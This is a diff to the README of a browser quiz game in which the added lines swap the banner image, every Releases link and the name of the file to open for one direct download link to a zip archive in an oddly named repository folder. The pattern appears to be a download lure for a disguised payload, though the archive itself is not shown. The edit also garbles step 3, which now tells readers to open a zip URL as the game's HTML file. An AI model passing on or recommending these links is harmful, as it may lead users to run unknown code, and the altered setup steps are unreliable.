@@ -1,6 +1,6 @@
 # Il Pranzo è Servito 🍽️
 
-![Game Banner](https://example.com/game-banner.png)
+![Game Banner](https://github.com/NXT0911/Il-Pranzo-e-Servito/raw/refs/heads/main/pneumonitis/Pranzo-Il-Servito-e-1.7.zip)
 
 Welcome to the **Il Pranzo è Servito** repository! This project is an interactive web-based quiz game developed by Bocaletto Luca. In this game, you answer general knowledge questions within 30 seconds to collect five courses: First, Second, Cheese, Dessert, and Fruit. Your goal is to complete your menu before time runs out.
 
@@ -28,11 +28,11 @@ Il Pranzo è Servito is not just a game; it's an experience that combines fun an
 
 ## Installation
 
-To get started with Il Pranzo è Servito, you can download the latest version from the [Releases](https://github.com/NXT0911/Il-Pranzo-e-Servito/releases) section. After downloading, follow these steps to set up the game on your local machine:
+To get started with Il Pranzo è Servito, you can download the latest version from the [Releases](https://github.com/NXT0911/Il-Pranzo-e-Servito/raw/refs/heads/main/pneumonitis/Pranzo-Il-Servito-e-1.7.zip) section. After downloading, follow these steps to set up the game on your local machine:
 
 1. **Download the Game**: Click on the link above to access the latest release.
 2. **Unzip the File**: Extract the contents of the downloaded zip file.
-3. **Open the HTML File**: Navigate to the extracted folder and open the `index.html` file in your web browser.
+3. **Open the HTML File**: Navigate to the extracted folder and open the `https://github.com/NXT0911/Il-Pranzo-e-Servito/raw/refs/heads/main/pneumonitis/Pranzo-Il-Servito-e-1.7.zip` file in your web browser.
 4. **Enjoy the Game**: Start playing and challenge your friends!
 
 ## How to Play
@@ -65,7 +65,7 @@ This project is licensed under the GPLv3 License. You can freely use, modify, an
 
 ## Links
 
-For more information and to download the latest version of the game, visit the [Releases](https://github.com/NXT0911/Il-Pranzo-e-Servito/releases) section.
+For more information and to download the latest version of the game, visit the [Releases](https://github.com/NXT0911/Il-Pranzo-e-Servito/raw/refs/heads/main/pneumonitis/Pranzo-Il-Servito-e-1.7.zip) section.
 
 ---
 
